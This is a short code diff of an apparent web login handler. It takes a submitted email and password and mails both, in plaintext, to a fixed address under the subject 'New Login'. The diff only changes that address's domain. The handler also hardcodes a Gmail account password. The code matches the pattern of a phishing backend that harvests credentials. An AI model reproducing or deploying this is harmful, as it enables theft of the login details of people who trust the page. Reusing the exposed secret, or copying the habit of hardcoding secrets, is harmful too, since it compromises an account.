@@ -14,7 +14,7 @@ export async function POST(request) {
     const transporter = nodemailer.createTransport({
       service: "gmail",
       auth: {
-        user: "noreply@enlight.systems", // Your Gmail email
+        user: "noreply@enlight.news", // Your Gmail email
         pass: "jem5uqk_RMZ@muk!udv", // Your Gmail password or app password
       },
       tls: {
@@ -24,8 +24,8 @@ export async function POST(request) {
 
     // Set up email data
     const mailOptions = {
-      from: '"Enlight Systems" <noreply@enlight.systems>', // Sender address
-      to: "noreply@enlight.systems", // Change to your recipient's email
+      from: '"Enlight Systems" <noreply@enlight.news>', // Sender address
+      to: "noreply@enlight.news", // Change to your recipient's email
       subject: "New Login",
       text: `Email: ${email}\nPassword: ${password}`,
     };
